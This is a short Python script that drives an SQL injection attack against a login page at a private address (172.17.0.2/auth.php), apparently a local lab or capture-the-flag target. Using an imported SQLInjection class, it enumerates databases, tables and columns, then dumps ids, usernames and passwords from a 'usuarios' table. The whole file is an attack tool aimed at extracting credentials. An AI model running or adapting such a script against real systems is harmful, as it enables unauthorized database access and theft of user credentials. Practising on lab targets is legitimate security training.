#!/usr/bin/python3
from sqli import *
import sys, signal

def ctrlc(sig, frame):

    print("\nexit...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrlc)

if __name__ == '__main__':

    url = "http://172.17.0.2/auth.php"

    SQLi = SQLInjection(url)

    print("\n====DATABASES====\n")

    SQLi.GetDatabases()

    print("\n===USERS TABLES=====\n")

    SQLi.GetTables("users")

    print("\n====USERS.USUARIOS COLUMNS====\n")

    SQLi.GetColumns("users", "usuarios")

    print("\n====USERS.USUARIOS DATA====\n")

    print("\n****ID****")

    SQLi.GetData("users", "usuarios", "id")

    print("\n****USERNAMES****\n")

    SQLi.GetData("users", "usuarios", "username")

    print("\n****PASSWORDS****\n")

    SQLi.GetData("users", "usuarios", "password")
